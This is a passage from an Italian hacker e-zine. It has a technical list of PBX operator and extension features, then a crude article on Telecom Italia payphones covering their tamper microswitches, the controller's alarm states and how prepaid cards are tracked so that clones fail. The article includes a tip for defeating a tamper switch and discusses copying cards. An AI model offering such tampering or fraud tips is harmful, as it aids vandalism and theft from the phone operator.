code di chiamate esterne, le code di chiamate interne ecc...
Generalmente queste code vengono gestite con il criterio FIFO oppure con
sistemi prioritari.

- ADDEBITO

L'operatore puo' ottenere la lettura degli scatti di addebito per quelle
chiamate da lui originate e inoltrate verso un interno. Alla fine della 
conversazione l'operatore riceve un avviso e tramite tasto puo' effettuare
la lettura degli scatti e il numero interno a cui addebitarli.

- ATTESA COMANDATA

Le chiamate che non possono essere inoltrate possono essere poste in
attesa (comandata) dal P.O.
Se la chiamate e' in attesa da piu' di un certo tempo se ne riceve la
segnalazione luminosa. Se sono presenti piu' chiamate in attesa e'
possibile esplorarne il buffer passo passo e riconoscerne l'identita'
tramite il riferimento all'utente desiderato.

- ATTESA AUTOMATICA ALTERNATA

Consideriamo un operatore che sia in connessione con un utente esterno.
Nell'impostare il numero interno per inoltrare la chiamata, l'esterno
viene posto automaticamente in attesa per dar modo all'operatore di
effettuare l'annuncio.
Alla risposta l'operatore ha due possibilita':

1) inoltrare la chiamata e disconnettersi da ogni collegamento
2) riprendere nuovamente l'esterno ponendo automaticamente in attesa l'interno

Quest'ultima operazione puo' ripetersi senza limitazioni e puo' terminare
con un normale inoltro o con un rilascio degli interlocutori.

- AVVISO PER ERRATE MANOVRE

In caso di errate manovre dell'ooperatore la chiamata non va perduta e
quest'ultimo riceve un avviso acustico e/o luminoso. L'avviso acustico e'
indispensabile per gli operatori non vedenti.

- CHIAMATA FRA OPERATORI

E' possibile chiamare o trasferire delle chiamate a uno specifico
operatore, selezionando il codice individuale dell'operatore. Oltre al
caso banale di trasferimento di chiamate personali, si pensi al caso
particolare di interlocutore di lingua straniera che abbia avuto risposta
da un operatore che non parli la sua lingua, mentre ve ne e' un altro con
cui potrebbe capirsi. In determinati ambienti (universita', banche) questo
puoo' essere indispensabile; in generale e' comunque un buon servizio.

- COMMUTAZIONE IN SERVIZIO NOTTE

L'esclusione si un P.O. e/o la commutazione in servizio notte si ottengono
tramite pressione di un semplice tasto o staccando il microtelefono. In
quest'ultimo caso la commutazione in servizio notte e' leggermente ritardata 
per consentire operazioni di spostamento laterale del microtelefono 
o semplice sostituzione dello stesso. Un caso di commutazione automatica
in servizio notte si ha quando il P.O. non da' risposta alle chiamate
entranti per oltre un certo tempo. Cio' accade per esempio quando il P.O.
rimane, per errore, non presidiato. Il sistema in tal caso cerca di
indirizzare la chiamata verso un'altra destinazione. Banale e' il caso di
commutazione automatica in servizio per guasto del P.O., purche' il guasto
sia totale o identificabile dai programmi diagnostici del sistema.
Analogamente il sistema si predispone in servizio notte all'atto 
dell'accensione.

- CONFERENZA A SEI

L'operatore che abbia effetuato un'operazione di inclusione stabilisce in
pratica una conferenza a tre, ma si puo' presentare il caso pratico di
estendere la conferenza a piu' di tre persone.
L'operatore deve avere pertanto questa possibilita' (fino ad un max di 6
interlocutori) e puo' estendersi in qualunque momento dalla conferenza
lasciando indisturbabili i restanti partner.

- DISPLAY

E' opportuno avere un'ampia visualizzazione delle operazioni in corso 
disponendo possibilmente di due display o almeno di due righe di
visualizzazione. Su essi saranno indicati rispettivamente il numero della
linea entrante o uscente, il numero interno selezionato o chiamante ecc..   
Potra' aversi altresi' la visualizzazione dell'orario e, per le chiamate
sottoposte a tariffazione, la visualizzazione degli scatti di addebito.

- INOLTRO DELLE CHIAMATE

L'operatore che abbia risposto a una chiamata esterna puo' inoltrarla a un
interno formando il numero dell'interno e premendo il tasto di inoltro.
L'inoltro puo' avvenire con annuncio o senza annuncio.
L'operatore riceve indicazioni sullo stato dell'utente interno.

- INOLTRO SU OCCUPATO

Una chiamata entrante inoltrata su utente interno occupato viene posta
automaticamente in attesa con relativa segnalazione d'attesa (musica,
messaggio registrato ecc..) L'interno occupato riceve invece il tono
d'avviso di chiamata in coda (non e' opportuno accodare piu' di una
chiamata. Se l'utente occupato non si libera entro un certo tempo la
chiamata in attesa sara' rinviata al P.O.

- INOLTRO A CATENA

Una chiamata esterna puo' richiedere di parlare in successione con due o
piu' interni. In tal caso l'operatore effettua un inoltro a catena verso
il primo interno della successione. Quando la conversazione e' terminata,
la chiamata esterna viene rinviata all'operatore in maniera riconoscibile
e con apposita segnalazione acustica e luminosa. L'operazione di inoltro a
catena viene ripetuta per ogni interlocutore della successione tranne che
per l'ultimo. Analoga procedura si puo' realizzare per le chiamata
uscenti.

- INOLTRO SENZA ANNUNCIO

Le chiamate transitanti dal posto operatore possone essere inoltrate anche
senza annuncio verso gli utenti interni. Nel caso in cui la chiamata non
ottenga risposta entro un certo tempo si ha un ritorno all'operatore. Cio'
consente di snellire il lavoro dell'operatore ed allo stesso tempo di
prestare attenzione a quelle chiamate che non trovano risposta.

- INCLUSIONE SU INTERNO OCCUPATO

L'operatore che, nel tentativo di inoltrare una chiamata ad un interno, lo
trova occupato, puo' includersi, sulla conversazione in corso per
avvertire delle presenza di una chiamata in attesa. L'interno si libera e
la chiamata viene regolarmente inoltrata. Durante la fase di inclusione un
particolare tono avverte della presenza di un terzo interlocutore.
E' opportuno che l'operazione di inclusione possa avvenire anche quando
l'operatore non ha una chiamata da inoltrare (l'inclusione non avviene se
l'apparecchio e' fuori posto oppure se l'interno ha sganciato in quel
momento).

- INCLUSIONE SU LINEA URBANA

E' possibile per l'operatore, con apposita manovra di inclusione,
selezionare una ben determinata linea urbana, che se risulta occupata
consente l'inserimento nella conversazione da parte del P.O. Se invece la
linea e' libera il P.O. ricevera' il consueto tono urbano. Cio' consente
due tipi di servizi:

1) e' possibile controllare le linee urbane una a una e individuare le
   eventuali linee urbane guaste
2) in caso di linee tutte occupate il P.O. puo' includersi su una linea
   per richiederne l'uso tramite volontaria esclusione degli interlocutori;
   oppure, in caso di emergenza, forzarne l'eslusione, sempre che il sistema
   lo permetta. 

- IMPEGNO LINEA USCENTE

L'impegno di una linea urbana o di una giunzione e' effettuabile mediante
pressione di apposito tasto o selezione del codice di impegno. E' opportuno
avere la visualizzazione della linea occupata: in caso di guasto si riconosce
subito qual e' la linea guasta.

- IDENTIFICAZIONE DELLE CHIAMATE ENTRANTI

Generalmente e' possibile identificare le chiamate entranti differenziando
quelle interne da quelle esterne poiche' la segnalazione al P.O. giungono
su tasti differenti. Nell'ambito delle chiamate esterne si ha sul
visualizzatore l'identificazione del fascio e delle linea da cui proviene
la chiamata. Per le chiamate interne invece viene visualizzato il numero
dell'apparecchio interno chiamante.

- IDENTIFICAZIONE DI FASCIO OCCUPATO / FASCIO BLOCCATO

E' opportuno avere la segnalazione per l'operatore quando tutte le linee
di un cero fascio sono occupate.
Inoltre, se e' consentito bloccare i fasci e' necessario vi sia anche la
segnalazione relativa a quest'ultima condizione.

- INDICAZIONI DI ALLARME

Quasi sempre il P.O. ha la possibilita' di vedere segnalati due allarmi,
uno maggiore e uno minore. Qualche sistema consente anche di leggere sul
visualizzatore, in forma codificata, il tipo di allarme riscontrato e dare
cosi' valide informazioni al personale tecnico che dovra' intervenire.

- INTERNO DI OVERFLOW

In condizione di alto traffico si puo' stabilire che quelle chiamate che
stanno in bussata sul P.O. peroltre un tempo prefissato siano dirottate ad
uno o piu' numeri interni, allo scopo di dare sollecita risposta alle
chiamate entranti. La prestazione deve essere programmabile e non imposta,
e implementata solo su richiesta dell'utente.

- MEMORIZZAZIONE DI UN NUMERO

Una prestazione simile alla precedentee' quella di poter memorizzare uno
specifico numero e conservato inalterato, in modo da poterlo impostare, in
qualsiasi momento, mediante pressione di un semplice tasto. Questa prestazione
prende anche il nome di selezione automatica.

- POSTO OPERATORE PER NON VEDENTI

Qualunque sistema telefonico deve disporre di un P.O. per non vedenti.
Solitamente cio' si ottiene sostituendo ai segnalatori ottici (LED) dei
segnalatori tattili. In alternativa si possono impiegare circuiti di
sintesi vocali, molto utili nel caso ad esempio si debba segnalare
un'errata manovra, oppure delle console in Braille.

- PRONTA RICHIESTA

Dipendentemente dalle condizioni di traffico e se l'operatore lo decide
puo' essere prontamente soddisfatta una richiesta di numero urbano da
parte di un interno. Il numero interno che era in connessione con il P.O.
viene posto automaticamente in attesa; appena il numero urbano risulta
libero il P.O. si esclude e l'interno viene posto in connessione con
l'esterno.

- PROGRAMMAZIONE E DIAGNOSI DA P.O.

Soprattutto nei piccoli sistemi, privi di console di sistema, il P.O.
viene anche usato come dispositivo di I/O per effettuare la lettura di
dati, test diagnostici, programmazione del sistema, ecc... Il tutto
controllato da password o da chiave di controllo.

- RICERCA PERSONE

In particolari utenze la' dove esistono gruppi di persone in continuo
spostamento, l'operatore deve avere la possibilita' di accedere a sistemi
di ricerca persone, ponendo in attesa la linea esterna ed inoltrandola una
volta individuata una volta individuato l'interno. In alternativa l'utente
ricercato che abbia ricevuto relativo avviso acustico deve potersi
connettere alla chiamata esterna anche automaticamente.

- RIPETIZIONE DELL'ULTIMO NUMERO SELEZIONATO

In caso di utente esterno occupato e' possibile, se e' fornita la
prestazione suddetta, ritentare la chiamata con la semplice pressione di
un tasto. Concettualmente il sistema memorizza automaticamente l'ultimo
numero selezionato che quindi puo' essere ribattuto dal sistema stesso.

- SELEZIONE ABBREVIATA

Consente di selezionare un codice abbreviato al posto dell'intero numero
esterno. L'associazione tra codice abbreviato e numero esterno e' fatta
inizialmente dal personale tecnico, in una lista che viene detta lista di
selezione abbreviata. L'operatore puo' aggiornare quest liste, inserendo o
disinserendo dei numeri.
Esistono le liste di sistema utilizzabili dal P.O. e dagli utenti interni
abilitati al servizio, e le liste personali, specifiche di un certo utente
interno. Queste liste possono servire quale mezzo di scavalcamento della
classe di abilitazione di un interno, ovviamente per i soli numeri
interurbani presenti in lista.

3.0.3 SERVIZI DEGLI UTENTI

- AVVISO DI CONFERMA DEI SERVIZI IMPOSTATI 

E' proprio alla luce di quanto detto che si comprende come generalmente
ogni codice di servizio sia seguito da un tono di conferma indicante
l'avvenuta accettazione delle richiesta da parte del sistema. E' il caso
delle richiamata, della prenotazione, della deviazione temporanea ecc...
Va anche precisato che negli esempi riportati differenti sono il momento
ed il modo con cui si ottiene la conferma del servizio imposto: nel caso
della richiamata un tono di richiamata conferma il servizio richiesta
subito dopo l'impostazione della cifra di richiamata. Nel caso della
prenotazione si ricevono degli squilli differenti dalla bussata normale
proprio per ricordare all'utente che si tratta non di una chiamata ma di
una prenotazione. Infine un apparecchio che abbia impostato una deviazione
temporanea riceve allo sgancio un tono interno diverso dal solito, per
ricordare la prestazione implementata da quell'apparecchio.
Una considerazione a parte merita il tono di inclusione che viene fornito
ogni qualvolta l'operatore o un interno abilitato attivano la prestazione.
Cio' garantisce la dovuta riservatezza delle conversazioni interne ed
esterne. A richiesta si puo' sempre escludere la possibilita' di subire
l'inclusione per alcuni interni.

- CHIAMATA DIRETTA

E' la chiamata che raggiunge direttamente una destinazione al solo sgancio
del microtelefono. La destinazione puo essere un altro numero interno,
l'operatore o anche un numero esterno. La prestazione puo' essere
utilizzata pe una rapida chiamata verso un numero interno (o esterno) di
emergenza.

- CHIAMATA DIRETTA CON RITARDO

Dopo lo sgancio del microtelefono, viene attivato un piccolo ritardo. Se
in questo tempo viene avviata una selezione, il sistema gestisce la
selezione e non attiva la chiamata diretta. Si puo' cosi' usare uno stesso
apparecchio per una duplice funzione.

- CHIAMATA A GRUPPI (HUNT)

In concomitanza ai gruppi di risposta per assente si possono instaurare
dei gruppi di ricerca (hunt), per i quali il sistema stesso provvede a
ricercare e a smistare le chiamate verso un interno non occupato. In
questo caso si ha una deviazione delle chiamate da utente occupato verso
utente non occupato. A questa condizione si puo' sommare anche la
condizione di deviazione per non risposta, cioe' una chiamata diretta ad
un elemento del gruppo che non risponde viene automaticamente dirottata
all'elemento successivo. Si ha in tal caso una deviazione automatica per
non risposta, da non confondere con il caso di risposta per assente.
Se abilitato, un elemento del gruppo puo' imporre la momentanea esclusione
dal gruppo stesso e in tal caso la chiamata viene subito dirottata al
successivo elemento del gruppo. Cio' non preclude all'apparecchio la
possibilita' di effettuare e ricevere chiamate. Un codice di reinserimento
lo riportera' all'interno del gruppo. I gruppi di ricerca sono compatibili
con i gruppi di risposta per assente.

- DEVIAZIONE COMANDATA O SEGUIMI (follow me)

In linea di principio consente ad un utente che si allontani temporanemante, 
dal suo apparecchio, di "portarsi dietro" le chiamate normalmente dirette
al proprio apparecchio interno. Questo sevizio puo' essere implementato ed
attovato in diverse maniere. Puo' essere intesa come una prestazione non
ricorsiva, per cui un apparecchio che abbia subito una deviazione non puo'
a sua volta effettuarla (e analogamente se l'ha effettuata non puo'
subirla). Oppure se intesa come prestazione ricorsiva si possono attivare
delle deviazioni a catena.
Con l'attivazione di "follow me" si possono trasferire o meno sull'apparecchio
destinatario tutti i servizi e le prestazioni (si pensi ad esmpio alla
classe di abilitazione) proprie dell'apparecchio originatario. Si puo'
attivare la prestazione dall'apparecchio originatario, oppure predisporla
da questo e completarla dall'apparecchio destinatario, oppure attivarla 
dal P.O.
L'apparecchio che abbia attivato il seguimi conserva in ogni caso le sue
caratteristiche. Per far ricordare la prestazione attivata viene per esso
inserito un tono interno diversodal solito. Il P.O. ha la possibilita' di
scegliere quale interno far squillare, se l'originatario o il destinatario
della deviazione.

- DISABILITAZIONE DELL'APPARECCHIO

La disabilitazione dell'apparecchio puo' essere ottenuta via software, con
un codice personale oppure con una chiave di blocco. Un tentativo di
chiamata esterna da quell'apparecchio provoca segnali di occupato o
chiamate verso il P.O. L'apparecchio puo' ancora essere impiegato per
chiamate interne.

- DIRETTORE-SEGRETARIA

La prestazione del seguimi e' gia' un modo per implementare un servizio
direttore-segretaria. Naturalmente in questo caso l'apparecchio della
segretaria deve conservare le sue caratteristiche e non assumere
necessariamente quelle del direttore. Un'altra possibilita' che occorre
prevedere e' quella di far filtrare dalla segreteria le solite chiamate
esterne (dirette al direttore) e non quelle interne. Queste ultime
potranno raggiungere la segretaria solo nel caso l'apparecchio del
direttore venga dichiarato assente. Per chi dispone di apparecchi con
tasti funzione sono previste altre importanti prestazioni tra cui la
possibilita' di una chiamata vocale tra il direttore e la segretaria. 

- INDICAZIONE DI CHIAMATA IN CODA

L'operatore che abbia inoltrato una chiamata su utente interno occupato
provoca verso l'utente occupato un tono intermittente di chiamata in coda.
Appena questi si libera ricevera' la chiamata in attesa.

- INCLUSIONE / PROTEZIONE DA INCLUSIONE

Questa prestazione e' disponibile anche a livello utente, oltre che a
livello operatore. Essa si attua con diverse modalita': si puo' abilitare
un interno a fare inclusione e a non subirla, oppure a subirla senza
poterla fare, ecc. 
In particolare alcuni utenti interni devono essere protetti da qualunque
operazione di inclusione. Per essi e' opportuno pero' poter disporre di un
messaggio automatico di chiamata urgente (distinti dalla segnalazione di
chiamata in coda). Molto utile e' la combinazione delle prestazioni di
richiamata e di inclusione.
Un derivato che, nel tentativo di trasferire una chiamata esterna a un
interno, lo trovi occupato, se abilitato puo' includersi e quindi
completare la manovra di trasferta.

- LINEA URBANA DIRETTA (LINEA PRIVATA)

Questa prestazione consente l'associazione diretta tra un interno e una
linea urbana, di modo che le chiamate urbane entranti su quella linea
siano presentate direttamente a quell'interno e viceversa solo
quell'interno abbia la possibilita' di impegnare specificamente quella
linea con immediato ascolto del tono urbano: vengono dette anche linee
private. In caso di mancata risposta la chiamata viene deviata
all'operatore oppure al servizio notte.

- MEMORIZZAZIONE DI UN NUMERO

Per ogni interno e' possibile inoltre memorizzare un numero specifico
(esterno) e rilanciarlo con un semplice codice ogni volta che si vuole.
La memorizzazione di un nuovo numero cancella quello precedente. Questa
prestazione viene detta anche selezione automatica.

- MUSICA SU ATTESA

La prestazione di musica su attesa e' disponibile anche per gli utenti
interni (in attesa) oltre che per gli utenti esterni. In alternativa si
possono effettuare collegamenti cono la filodiffusione o inviare messaggi
registrati.

- NON DISTURBARE

L'utente interno posto in questo stato (dall'operatore) fa si che le
chiamate a lui dirette siano deviate aal P.O. Il P.O. puo' all'occorenza
forzare temporaneamente questa condizione.

- PRENOTAZIONE AUTOMATICA

Un utente interno che abbia selezionato e trovato occupato un altro utente
puo' attivare il codice di prenotazione automatica e riagganciare.
Nell'attesa di essere servito puo' ancora utilizzare il proprio
apparecchio, e la richiesta viene soddisfatta solo quando entrambi gli
utenti risultino liberi.
L'utente che ha attivato la prenotazione riceve una chiamata particolare
ed al suo sgancio parte una regolare bussata verso l'altro utente. Se
l'utente interno che ha attivato la prenotazione non risponde, la
prenotazione viene cancellata. Esiste anche un codice di cancellazione
della prenotazione. Analoga procedura puo' essere attivata nel caso di
fascio urbano occupato. In altre parole l'utente che, selezionato il
codice di linea urbana, abbia ricevuto il tono di occupato, puo' attivare
il codice di prenotazione automatica e riagganciare: viene servito non
appena si libera una linea urbana.

- PRIORITA' DI ACCESSO al P.O.

Una particolare classe di servizio oppure la selezione di un codice
particolare possono contraddistinguere come prioritaria una chiamata verso
il P.O. Cio' permette di implementare un sistema di utenti privilegiati.

- PROTEZIONE COMANDATA

Un utente che si accinge a effettuare una trasmissione dati tramite linea
telefonica puo' attivare un codice di protezione dati onde garantire la
piena attendibilita' dei dati trasmessi. La protezione comandata puo'
essere usata in alternativa per quelle linee che non hanno la protezione
di inclusione tra le loro classi di funzioni.

- REGISTRAZIONE DELLE CHIAMATE USCENTI

Permette di ottenere una stampa delle chiamate uscenti senza il costo di
addebito.

- RESTRIZIONI ALLA SELEZIONE PASSANTE

Questa prestazione permette di impedire che le chiamate in selezione
passante possano raggiungere direttamente un interno, ma solo tramite P.O.

- RESTRIZIONE ALLE CHIAMATE URBANE

Puo' essere richiesto che un utente interno sia raggiungibile in selezione
passante ma non possa ricevere chiamate urbane in nessun caso (l'operatore
o un altro interno non possono trasferirgli una chiamata urbana). In tal
caso bisogna classificare l'interno come ristretto alle chiamate urbane.

- RICHIAMATA

Consente ad un interno di porre in attesa automatica il suo interlocutore
per consultare un altro utente. La prestazione si attiva in differenti
modi (selezione cifra 1, tastino di terra, colpo di gancio) e provoca la
messa in attesa automatica dell'interlocutore attuale e il tono di
richiamata per l'utente che ha richiesto il servizio. A questo punto
l'utente e' libero di consultare la persona che desidera semplicemente
formando il suo numero telefonico. Al termine della consultazione il
secondo interlocutore riaggancia e il primo utente puo' riprendere la
persona in attesa riselezionando il codice di richiamata. Vi sono alcune
varianti e/o miglioramenti di questo servizio.

- RICHIAMATA E TRASFERTA

L'utente che ha attivato la prestazione di richiamata puo' decidere di
trasferire la chiamata in attesa verso l'interlocutore richiamato
semplicemente riagganciando il suo apparecchio. La trasferta puo' avvenire
con o senza consultazione, con o senza annuncio.
Se durante una trasferta senza annuncio si commette un errore (es. numero
selezionato incompleto o numero selezionato errato), la chiamata in
attessa viene accodata al P.O. Si puo' anche effettura un regolare rinvio
verso il P.O., una trasferta al P.O.

- RICHIAMATA ALTERNATA

Attivata la prestazione di richiamata e consultato il secondo interlocutore si
puo' decidere di riprendere il primo, senza abbandonare del tutto il
secondo, cioe' ponendolo a sua volta in attesa; poi si puo' ritornare sul
secondo ponendo di nuovo in attesa il primo e cosi' via quante volte si
vuole. Questa prestazione prende il nome di spool, ma immagino che
l'avevate capito :) 

- RICHIAMATA E CONFERENZA 

Si passa in conferenza sempre dalla fase di richiamata. E' sufficiente che
l'interlocutore richiamato rimanga in linea senza cioe' riagganciare il
microtelefono e che l'utente richiamante riformi il codice di richiamata.
I tre interlocutori si ritrovano in tal modo in conferenza con il dovuto
tono di inclusione in sottofondo.
Se previsto dal sistema la conferenza a tre puo' essere estesa a quattro,
cinque o sei persone.

- RIPETIZIONE DELL'ULTIMO NUMERO SELEZIONATO

Per ogni interno il sistema memorizza automaticamente l'ultimo numero
selezionato. Questa nuova selezione cancella il precedente numero
memorizzato. E' possibile dunque far ripartire la selezione con una
semplice manovra senza dover riselezionare l'esterno. La prestazione e'
particolarmente utile in caso di utente esterno occupato.

- RISPOSTA PER ASSENTE

Per apparecchi interni disposti in uno stesso ambiente, cioe' a vista, o
comunque quando da uno di essi e' possibile riscontrare se uno qualunque
degli altri sta squillando, e' molto utile il servizio di risposta per
assente. Purche' dichiarati appartenenti allo stesso gruppo di risposta
per assente, una qualunque chiamata diretta verso un interno non
presidiato puo' essere prelevata da un interno presente mediante
formazione del codice di risposta per assente. Cio' ha un senso pieno solo
nel caso che gli utenti dello stesso gruppo svolgano attivita' lavorativa
similiari. Si noti che e' la persona presente a dirottare verso di se' la
chiamata diretta a una persona non presente, mediante formazione di un
codice.

- SELEZIONE ABBREVIATA

E' lo stesso tipo di servizio utlizzabile dal P.O., che come abbiamo gia' visto
consente di selezionare un codice abbrevitao al posto del numero urbano o
interurbano. Naturalmente occorre essere abilitati al servizio. Nella
forma piu' ampia esso consente agli utenti di superare le restrizioni
imposte dalla loro classe di abilitazione, cioe' di chiamare numeri
interurbani inseriti in lista anche dagli apparecchi non abilitati
all'interurbana. Infine ricordiamo che si possono creare delle liste
personali si selezione abreviata.

- SERVIZIO DI ADDEBITO / TARIFFAZIONE

Per ogni utente e' possibile conteggiare gli scatti di tariffazione
provenienti dalla centrale urbana. La lettura degli scatti puo' essere
fatta dall'operatore oppure puo' venire stampata automaticamente su
dispositi di stampa con frequenza giornaliera/settimanale/mensile, con o
senza azzeramento della stampa.

3.0.4. SERVIZI AVANZATI

I servizi avanzati sono quelli per esempio che rendono possibile un
segreteria telefonica personale, servizi di telecontrollo (videolento),
gestione archivi, conversione protocolli ecc.... 

Tutte queste informazioni possono essere trovate e maggiormente approfondite neiseguenti libri:

"Principi di telefonia elettronica" di Luigi Pierro 
(ho un'edizione un po' vecchiotta ma non mi dispiace affatto)

"Trasmissione dell'informazione" A. Cecconelli ~ A. Tomassini

Pensate che sia reato avere sete d'informazione? 

pIGpEN

-----------------------[ L'ANG0LiN0 Di MAMMA TELEC0M ]------------------------
----------------------------------[ Jaiss ]-----------------------------------

Prefazione by Cavallo: questo articolo e' stato scritto dall'amante della
Telecom (nella sua forma (la)trina: TIN, TIM, TELECOM ITALIA =)) Jaiss,
per chi non lo sapesse (cioe' tutti) Jaiss e' il bravo ragazzo che mi aiuto'
nel "testare" il numerillo delle ricariche dei centri TIM a suo tempo: dopo
averlo perso di vista per molti mesi l'ho finalmente incontrato di nuovo ed
ho scoperto con piacere che era ancora interessato a queste faccende
"simpatiche".
Ringraziandolo per il servizio reso nella stesura del mio pezzo, vi lascio
ora (finalmente, hai rotto i coglioni =)) al SUO articolo:

  ************************************************************************
      L'angolino (puzzolente) di TeleKom Italia Merda, by jaiss
  ************************************************************************

Consumo           : 4 diana blu (cazzo quanto fumo)
Colonna sonora    : Led Zeppellin, Phisical Graffiti
immagini osservate: la stupenda harumi inoe (grandissima fica asiatica)
imprevisti        : diarrea improvvisa, vomito, di conseguenza sedia e
                    tastiera sbrodate
tempo previsto    : 30 min. at 33.6bps

Dunque, vediamo un po' se possiamo osservare meglio il fantastico mondo
di Telekom e della telefonia pubblica.
Innanzitutto vorrei, come dire, avvisare tutti che la teleKom e' si' una
maiala puttana sfruttatrice, ma non e' cosi'stupida come sembra.
Quello che voglio dire e' che nonostante ci siano molti bug nella rete
telefonica italiana, se sfruttati questi non possono arrecare danno alla
sopracitata azienda di merda, ma al massimo a qualche utente. Quindi la
teleKom dice "chissenefrega".
Ricordarsi quindi che teleKom e' sempre attenta nei suoi riguardi,
fottendosene invece degli utenti, e che se anche gli scatti alla risposta
qualche volta sono 2 invece di 1, beh, poco gli importa.

Prendiamo ad esempio un semplice telefono pubblico.
Sembra che lui se ne stia li' da solo, incustodito, a prendere caldo e freddo,
pedate, calci e talvolta si vede anche amputare la sua amatissima cornetta.
La signora teleKom, in seguito agli svariati miliardi spesi, derivanti da
atti di vandalismo, si e' premunita.
Chiaramente, cio' che leggerete non e' frutto dell'intelligenza di qualche
Einstein al vertice, sono solo metodi copiati da altre aziende telefoniche
che se lo sono fatto mettere nel culo da anni e che ad un tratto si sono
stufate (at&t).

Personalmente ho avuto tra le mani un telefono pubblico con Rotor e monete,
con le chiavi di apertura di tutto! (il tecnico l'aveva lasciato li'
perche' al lavoro dovevano ristrutturare, e io nella pausa me lo sono
aperto tutto; vi ho trovato la bellezza di 6 microswitch di sicurezza
che segnalano l'apertura e/o il distacco del telefono o di sue parti:

1 sul retro del telefono, tra la piastra (quindi per staccarli occhio
che se ne accorgono; o fate veloce come il vento oppure inserite un bel
nonsochecosa tra il telefono e la piastra, oppure ancora meglio
vi portate a casa telefono, cabina ed un bel pezzo di asfalto p.s.
guardate che su due ruote non ce la fate, pesa quasi 30kg!)

1 tra il lettore schede ed il telefono (solito avvertimento)
1 sull'apertura del vano interno

3!!! sul cassetto delle monete (oramai non ce ne sono piu') e precisamente:
1 scatta appena si gira la chiave di apertura della scatola (personalmente
la ritengo veramente blindata!! 3.5mm di acciaio!), 1 appena si e' aperto lo
sportello e l'ultimo quando si estrae il cassetto delle monete.
La delusione piu' grande e' stato il non trovare un cazzo all'interno del
vano.... neanche 100lire!! (gia' cazzo, essenno' ti lasciavan le chiavi..
siiii!)

Chiaramente questi cazzo di microswitch da soli non servono ad un cazzo
vediamo a cosa sono collegati.
A valle di ogni 5/6 telefoni pubblici, in un posto che non centra un bel
cazzo con le cabine telefoniche (tipo una torretta grigia o interrato),
la maiala della teleKom installa un bel (concedetemi il termine) controller.
In effetti il nome rende l'idea; cosa fa questo cazzo di controller?
CONTROLLA!
Attraverso il cavo telefonico tra lui e le cabine egli dialoga con esse.
Il pezzo di merda e' programmato (sempre dalla maiala) per tenere sott'occhio
alcuni status delle "sue" cabine telefoniche: attualmente gli status
dovrebbero essere i seguenti:

- standby (ma che termine del cazzo vero?)
- in uso
- fuori uso
- cornetta alzata
- telefonata intercontinentale
- ripetizione intensa (annoying) di un numero
- traffico telefonico eccessivo
- rotor fuori uso
- cestello monete pieno
- carta telefonica incastrata
- troppi tentativi inserimento carta telefonica
- chiamate a numeri speciali e/o controllati
- distacco dalla parete della cabina
- urto (bisogna picchiare forte)
- apertura/manomissione 
- apertura chiave cestello monete
- apertura *sportello* cestello monete
- apertura *cassetto* contenente monete
- tentativo di manomissione doppino telefonico

Ora, questo significa che il "controller" sa sempre quello che sta succedendo
alle cabine, ma a che serve saperlo e basta? Giustissimo, infatti lo stronzo
provvede ad effettuare una delle seguenti cose in seguito ad un particolare
status che persista per piu' di tot secondi:

- semplice avviso all'"assistenza" (es. ritiro monete, riparazione etc..)
- disabilitazione cabina pubblica ed avviso non urgente all'"assistenza"
  teleKom (traffico intenso, troppe chiamate intercontinentali etc..;
  e..... (per danni fisici all'apparecchio e /o manomissioni e/o telefonate
  a numeri "strani") avviso urgente alla "assistenza" e/o autorita' p.s.
  (e non e' una cazzata!)

Quindi occhio, facciamo sempre le cose con prudenza!
Si', tutto cio' e' molto bello ma andiamo pure avanti...
Questo dovrebbe avervi fatto capire (se gia' non lo sapevate) che alla
teleKom si son attrezzati e quindi dovrebbe avervi fatto riflettere
sul principio di funzionamento delle schede magnetiche telefoniche prepagate.
Dico io, son circa 6 anni che le schede telefoniche sono a giro e nessuno
e' ancora riuscito a fotterle? Direte voi, "forse chi l'ha fatto lo tiene
per se..." mmh, in italia ste' cose non funziano, siamo troppo impegnati
a sputtanare agli amici che "se fai cosi', cosi' e cosi....." il metodo
fa il giro del paese, arriva agli orecchi di chi di dovere e trovano
il modo di impedirlo (vedi NO-BOXING in italia).
(Se poi con il NO-BOXING avete capito che in italia non si pratica la
Boxe, beh, e' meglio che saltiate al prossimo articolo! :)

Diciamo che in italia esistono diverse "scuole di pensiero" (come disse
Cavallo)  per quanto riguarda la teoria di funzionamento delle tessere,
ma personalmente ritengo il seguente l'unico che giustifica la sicurezza
delle schede, la teleKom si e' trovata un metodo veramente sicuro *per lei*
cioe' non l'incopiabilita', ma la sua *inutilita'*
Mi e' stato detto che a Napoli si vendono schede copiate.
Bhe questo sara' sicuramente vero, pero'... leggete e capirete.

Lo schema di funzionamento di una scheda magnetica e' il seguente:
la lunghezza della banda magnetica ne stabilisce l'importo (grazie al cazzo
fin qui c'eravamo arrivati anche noi); al suo interno vi e' memorizzato un
numero, diciamo "seriale" che la rende univoca e diversa da tutte le altre.
Supponiamo di voler effettuare una telefonata con una scheda nuova: si
inserisce la scheda, ci sono 2/3 sec.di ritardo, appare l'importo e si puo'
telefonare. In quel preciso istante il numero seriale della scheda telefonica
ed il suo importo viene comunicato in centrale che provvede ad "registrare"
l'avvenuto sverginamento della scheda.
Voi intanto telefonate e nel frattempo il finto stupido telefono pubblico
continua a inviare dati alla centrale sulla vs. scheda ad ogni scatto.
Il risultato e' una scheda che viene "monitorata" ad ogni suo utilizzo.
Telefonata conclusa, la centrale sa che sulla scheda numero 123456978745131
rimangono esattamente (poniamo) 4500 lire.
Ora supponiamo di copiare questa scheda. Ne facciamo 2 copie, ottenendo in
totale (aspe' che prendo la calcolatrice)...mmh, si'! 3 schede, 1 originale
e 2 copiate. Teoricamente dovremmo avere 3 schede con un credito residuo di
4500 lire ognuna vero? Ed in effetti e' cosi'! Almeno fino alla telefonata
successiva fatta con una delle 3! Perche'? E' semplice! Noi non abbiamo
creato delle nuove carte (il numero seriale e' sempre il solito),
all'inserimento di una delle tre per telefonare, la centrale continuera' il
conteggio dal punto in cui era rimasta prima, considerando ogni volta ognuna
delle tre schede come se si trattasse di una sola! Quindi esaurita una,
esaurite tutte (quindi il rotor centra poco con il conteggio, o almeno fino
ad un certo punto, il fatto da verificare e' che cazzo sia lo spostamento
della tessera al suo interno che si sente ad ogni scatto, e vi dico che non
cancella gli scatti dall'importo).

Poi un'altra cosina... lo sapete cosa succede se con la prima copia
(o la seconda, e' uguale) telfonate da, diciamo, Messina alle 10.15 ed un vs.
amico con l'altra alle 10.18 da Roma? Ricordate che per la centrale entrambe
sono la solita scheda, insomma... 3 minuti 400km! Oppure se le usate in
contemporanea? beh.... disabilitazione della scheda numero 123456978745131,
cioe' la vostra!
Questo e' un esempio, chiaramente l'aggiornamento delle centrali delle varie
